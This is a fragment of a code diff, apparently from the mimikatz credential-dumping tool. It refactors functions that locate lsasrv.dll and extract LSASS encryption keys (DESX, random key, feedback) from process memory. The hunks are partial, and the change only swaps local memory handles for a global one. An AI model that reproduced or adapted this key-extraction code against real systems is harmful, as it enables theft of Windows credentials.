@@ -35,8 +35,7 @@ PDWORD g_cbRandomKey;
 NTSTATUS kuhl_m_sekurlsa_nt5_init()
 {
 	struct {PVOID LsaIRegisterNotification; PVOID LsaICancelNotification;} extractPkgFunctionTable;
-	KULL_M_MEMORY_HANDLE hMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS aMemory = {&extractPkgFunctionTable, &hMemory};
+	KULL_M_MEMORY_ADDRESS aMemory = {&extractPkgFunctionTable, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
 	KULL_M_MEMORY_SEARCH sMemory;
 	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION vbInfos;
 	DWORD sizeOfSearch = sizeof(PTRN_WNT5_LsaInitializeProtectedMemory_KEY);
@@ -50,7 +49,7 @@ NTSTATUS kuhl_m_sekurlsa_nt5_init()
 		
 		if(kuhl_m_sekurlsa_nt5_hLsasrv)
 		{
-			if(kull_m_process_getVeryBasicModuleInformationsForName(&hMemory, L"lsasrv.dll", &vbInfos))
+			if(kull_m_process_getVeryBasicModuleInformationsForName(&KULL_M_MEMORY_GLOBAL_OWN_HANDLE, L"lsasrv.dll", &vbInfos))
 			{
 				sMemory.kull_m_memoryRange.kull_m_memoryAdress = vbInfos.DllBase;
 				sMemory.kull_m_memoryRange.size = vbInfos.SizeOfImage;
@@ -129,8 +128,7 @@ NTSTATUS kuhl_m_sekurlsa_nt5_clean()
 NTSTATUS kuhl_m_sekurlsa_nt5_acquireKeys(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION lsassLsaSrvModule)
 {
 	NTSTATUS status = STATUS_NOT_FOUND;
-	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, cLsass->hLsassMem}, aLocalMemory = {PTRN_WNT5_LsaInitializeProtectedMemory_KEY, &hLocalMemory};
+	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, cLsass->hLsassMem}, aLocalMemory = {PTRN_WNT5_LsaInitializeProtectedMemory_KEY, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
 	KULL_M_MEMORY_SEARCH sMemory = {{{lsassLsaSrvModule->DllBase.address, cLsass->hLsassMem}, lsassLsaSrvModule->SizeOfImage}, NULL};
 	DWORD sizeOfSearch = sizeof(PTRN_WNT5_LsaInitializeProtectedMemory_KEY);
 	LONG offFeedBack = OFFS_WNT5_g_Feedback, offpDESXKey = OFFS_WNT5_g_pDESXKey, offpRandomKey = OFFS_WNT5_g_pRandomKey;
@@ -179,8 +177,7 @@ NTSTATUS kuhl_m_sekurlsa_nt5_acquireKeys(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_
 BOOL kuhl_m_sekurlsa_nt5_acquireKey(PKULL_M_MEMORY_ADDRESS aLsassMemory, PBYTE Key, SIZE_T taille)
 {
 	BOOL status = FALSE;
-	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS aLocalMemory = {&aLsassMemory->address, &hLocalMemory};
+	KULL_M_MEMORY_ADDRESS aLocalMemory = {&aLsassMemory->address, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
 #ifdef _M_X64
 	LONG offset64;
 	aLocalMemory.address = &offset64;
